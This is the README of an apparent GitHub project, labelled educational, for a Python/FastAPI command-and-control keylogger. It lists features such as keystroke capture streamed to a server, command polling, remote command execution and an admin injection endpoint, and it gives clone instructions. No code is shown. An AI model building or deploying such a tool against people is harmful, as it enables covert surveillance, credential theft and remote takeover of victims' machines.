# C2 Command & Control Keylogger Framework (Educational)

A lightweight, cross-platform Command & Control (C2) system built with Python and FastAPI.  
The client (keylogger) sends keystrokes to the server and polls for remote commands.  
**For educational and authorized testing use only.**

## 🚀 Features
- ✅ Cross-platform (Windows & Linux)
- ✅ Real-time keystroke logging & HTTP streaming
- ✅ Command polling (polling-based C2)
- ✅ Remote command execution (`whoami`, `dir`/`ls`, etc.)
- ✅ Admin endpoint to inject commands (`/admin/add`)
- ✅ In-memory storage (easy to restart)

## 📦 Tech Stack
- **Backend:** FastAPI, Uvicorn
- **Client:** `pynput`, `requests`, `subprocess`
- **Future:** AES-256 GCM encryption (coming soon)

## 🔧 Installation

1. Clone the repo:
   ```bash
   git clone https://github.com/noobuser978-gif/C2C-Keylogger
   cd C2C-Keylogger
   ```
